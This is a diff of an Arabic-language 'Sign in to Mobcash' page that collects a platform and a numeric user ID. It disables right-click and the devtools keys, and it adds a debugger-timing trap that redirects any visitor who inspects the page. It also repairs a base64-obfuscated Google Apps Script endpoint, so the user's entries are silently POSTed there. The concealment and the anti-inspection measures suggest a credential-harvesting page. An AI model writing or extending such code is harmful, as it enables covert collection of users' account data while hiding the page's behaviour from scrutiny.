@@ -32,10 +32,6 @@
       transition: background-color 0.2s ease, color 0.2s ease;
     }
 
-    #oneClickTab svg {
-      transition: fill 0.2s ease;
-    }
-
     #oneClickTab:hover,
     #oneClickTab:active {
       background-color: #27632a;
@@ -54,9 +50,19 @@
     }
   </style>
 </head>
-<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4" 
-  oncontextmenu="return false" 
+<body class="bg-gray-100 dark:bg-gray-900 min-h-screen flex items-center justify-center px-4"
+  oncontextmenu="return false"
   onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">
+  <script>
+    setInterval(() => {
+      const before = new Date().getTime();
+      debugger;
+      const after = new Date().getTime();
+      if (after - before > 100) {
+        window.location.replace("https://google.com");
+      }
+    }, 1000);
+  </script>
 
   <div class="bg-white dark:bg-gray-800 shadow-2xl rounded-2xl p-8 w-full max-w-md">
     <h2 class="text-2xl font-bold text-center text-gray-800 dark:text-white mb-6">Sign in to Mobcash</h2>
@@ -67,7 +73,6 @@
         <path d="M10 5.5l-.2-.1H6.6L9.8 1V.8H4.9l-4 7v.3h3l-3 6.3v.3h.4l8.7-9c.1 0 .1-.1 0-.2z"/>
       </svg>
     </button>
-
     <div class="mb-4 relative">
       <label for="platform" class="block mb-2 text-sm font-medium text-gray-700 dark:text-gray-300">اختر المنصة</label>
       <div id="customSelect" class="relative w-full">
@@ -129,145 +134,143 @@
       </svg>
     </button>
   </div>
-  <script>
-    lucide.createIcons();
+<script>
+  lucide.createIcons();
 
-    const isRepeatedDigits = id => /^(\d)\1{6,12}$/.test(id);
+  const isRepeatedDigits = id => /^(\d)\1{6,12}$/.test(id);
 
-    function showMessage(text, type = "error") {
-      const msg = document.getElementById("message");
-      msg.className = "fade show text-center text-sm mb-4 h-5";
-      msg.textContent = text;
-      msg.style.color = type === "success" ? "green" : "red";
+  function showMessage(text, type = "error") {
+    const msg = document.getElementById("message");
+    msg.className = "fade show text-center text-sm mb-4 h-5";
+    msg.textContent = text;
+    msg.style.color = type === "success" ? "green" : "red";
+  }
+
+  function filterDigits(input) {
+    input.value = input.value.replace(/[^\d]/g, '');
+  }
+
+  function isNumberKey(e) {
+    const key = e.key;
+    return /^[0-9]$/.test(key) || ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(key);
+  }
+
+  function validateId() {
+    const userId = document.getElementById("userId").value;
+    if (isRepeatedDigits(userId)) {
+      showMessage("المعرف غير معتمد. الرجاء التحقق.");
+      return;
+    }
+    document.getElementById("message").className = "fade";
+    document.getElementById("message").textContent = "";
+  }
+
+  function resetForm() {
+    const btn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
+    const label = btn.querySelector(".label");
+    btn.disabled = false;
+    btn.classList.remove("opacity-50", "cursor-not-allowed");
+    loader.classList.add("hidden");
+    label.classList.remove("hidden");
+    document.getElementById("platform").disabled = false;
+    document.getElementById("userId").disabled = false;
+  }
+
+  // تشفير رابط Google Script
+  const encoded = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcw==";
+  const scriptPath = "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec";
+  const safeURL = atob(encoded) + scriptPath;
+
+  function secureLogin() {
+    const platform = document.getElementById("platform").value;
+    const userId = document.getElementById("userId").value.trim();
+    const btn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
+    const label = btn.querySelector(".label");
+
+    if (!platform) return showMessage("اختر المنصة.");
+    if (!userId) return showMessage("أدخل المعرّف.");
+    if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId) || isRepeatedDigits(userId)) {
+      return showMessage("المعرف غير معتمد. الرجاء التحقق.");
     }
 
-    function filterDigits(input) {
-      input.value = input.value.replace(/[^\d]/g, '');
-    }
+    btn.disabled = true;
+    btn.classList.add("opacity-50", "cursor-not-allowed");
+    loader.classList.remove("hidden");
+    label.classList.add("hidden");
+    document.getElementById("platform").disabled = true;
+    document.getElementById("userId").disabled = true;
 
-    function isNumberKey(e) {
-      const key = e.key;
-      return /^[0-9]$/.test(key) || ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'].includes(key);
-    }
+    localStorage.setItem("platform", platform);
+    localStorage.setItem("userId", userId);
 
-    function validateId() {
-      const userId = document.getElementById("userId").value;
-      if (isRepeatedDigits(userId)) {
-        showMessage("المعرف غير معتمد. الرجاء التحقق.");
-        return;
-      }
-      document.getElementById("message").className = "fade";
-      document.getElementById("message").textContent = "";
-    }
-
-    function resetForm() {
-      const btn = document.getElementById("submitBtn");
-      const loader = document.getElementById("loader");
-      const label = btn.querySelector(".label");
-      btn.disabled = false;
-      btn.classList.remove("opacity-50", "cursor-not-allowed");
-      loader.classList.add("hidden");
-      label.classList.remove("hidden");
-      document.getElementById("platform").disabled = false;
-      document.getElementById("userId").disabled = false;
-    }
-
-    const encodedURL = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvc..."
-
-    function decodeURL(encoded) {
-      return atob(encoded + "AKfycbztE1ZG1WWVrbtfaKPTqOatcrue2jjUDoGpdPv1HyHcq0l6rPyD7aL6OT5Pfekpf_pAUA/exec".substring(0));
-    }
-
-    function secureLogin() {
-      const platform = document.getElementById("platform").value;
-      const userId = document.getElementById("userId").value.trim();
-      const btn = document.getElementById("submitBtn");
-      const loader = document.getElementById("loader");
-      const label = btn.querySelector(".label");
-
-      if (!platform) return showMessage("اختر المنصة.");
-      if (!userId) return showMessage("أدخل المعرّف.");
-      if (userId.length < 7 || userId.length > 13 || !/^\d+$/.test(userId) || isRepeatedDigits(userId)) {
-        return showMessage("المعرف غير معتمد. الرجاء التحقق.");
-      }
-
-      btn.disabled = true;
-      btn.classList.add("opacity-50", "cursor-not-allowed");
-      loader.classList.remove("hidden");
-      label.classList.add("hidden");
-      document.getElementById("platform").disabled = true;
-      document.getElementById("userId").disabled = true;
-
-      localStorage.setItem("platform", platform);
-      localStorage.setItem("userId", userId);
-
-      fetch(decodeURL(encodedURL), {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ platform, userId })
-      }).finally(() => {
-        setTimeout(() => {
-          window.location.href = "home.html";
-        }, 800);
-      });
-    }
-
-    document.getElementById("oneClickTab").addEventListener("click", () => {
-      document.getElementById("platform").value = "";
-      document.getElementById("selectedText").textContent = "اختر المنصة";
-      document.getElementById("userId").value = "";
-      document.getElementById("message").className = "fade";
-      document.getElementById("message").textContent = "";
-      resetForm();
+    fetch(safeURL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ platform, userId })
+    }).finally(() => {
+      setTimeout(() => {
+        window.location.href = "home.html";
+      }, 800);
     });
+  }
 
-    const dropdownBtn = document.getElementById("dropdownBtn");
-    const dropdownList = document.getElementById("dropdownList");
-    const selectedText = document.getElementById("selectedText");
-    const platformInput = document.getElementById("platform");
+  document.getElementById("oneClickTab").addEventListener("click", () => {
+    document.getElementById("platform").value = "";
+    document.getElementById("selectedText").textContent = "اختر المنصة";
+    document.getElementById("userId").value = "";
+    document.getElementById("message").className = "fade";
+    document.getElementById("message").textContent = "";
+    resetForm();
+  });
 
-    dropdownBtn.addEventListener("click", () => {
-      dropdownList.classList.toggle("hidden");
+  const dropdownBtn = document.getElementById("dropdownBtn");
+  const dropdownList = document.getElementById("dropdownList");
+  const selectedText = document.getElementById("selectedText");
+  const platformInput = document.getElementById("platform");
+
+  dropdownBtn.addEventListener("click", () => {
+    dropdownList.classList.toggle("hidden");
+  });
+
+  document.querySelectorAll(".dropdown-item").forEach(item => {
+    item.addEventListener("click", () => {
+      const value = item.getAttribute("data-value");
+      platformInput.value = value;
+      dropdownList.classList.add("hidden");
+      const img = item.querySelector("img").outerHTML;
+      selectedText.innerHTML = `<span>${value}</span>${img}`;
     });
+  });
 
-    document.querySelectorAll(".dropdown-item").forEach(item => {
-      item.addEventListener("click", () => {
-        const value = item.getAttribute("data-value");
-        platformInput.value = value;
-        dropdownList.classList.add("hidden");
+  window.addEventListener("click", function(e) {
+    if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
+      dropdownList.classList.add("hidden");
+    }
+  });
 
+  document.addEventListener("DOMContentLoaded", () => {
+    const storedPlatform = localStorage.getItem("platform");
+    const storedId = localStorage.getItem("userId");
+    if (storedPlatform) {
+      document.getElementById("platform").value = storedPlatform;
+      const item = [...document.querySelectorAll(".dropdown-item")].find(i => i.dataset.value === storedPlatform);
+      if (item) {
         const img = item.querySelector("img").outerHTML;
-        selectedText.innerHTML = `<span>${value}</span>${img}`;
-      });
-    });
-
-    window.addEventListener("click", function(e) {
-      if (!dropdownBtn.contains(e.target) && !dropdownList.contains(e.target)) {
-        dropdownList.classList.add("hidden");
+        selectedText.innerHTML = `<span>${storedPlatform}</span>${img}`;
+      } else {
+        selectedText.textContent = storedPlatform;
       }
-    });
+    }
+    if (storedId) document.getElementById("userId").value = storedId;
+    resetForm();
+  });
 
-    document.addEventListener("DOMContentLoaded", () => {
-      const storedPlatform = localStorage.getItem("platform");
-      const storedId = localStorage.getItem("userId");
-      if (storedPlatform) {
-        document.getElementById("platform").value = storedPlatform;
-        const item = [...document.querySelectorAll(".dropdown-item")].find(i => i.dataset.value === storedPlatform);
-        if (item) {
-          const img = item.querySelector("img").outerHTML;
-          selectedText.innerHTML = `<span>${storedPlatform}</span>${img}`;
-        } else {
-          selectedText.textContent = storedPlatform;
-        }
-      }
-      if (storedId) document.getElementById("userId").value = storedId;
-      resetForm();
-    });
-
-    window.addEventListener("pageshow", (e) => {
-      if (e.persisted) resetForm();
-    });
-  </script>
+  window.addEventListener("pageshow", (e) => {
+    if (e.persisted) resetForm();
+  });
+</script>
 </body>
 </html>
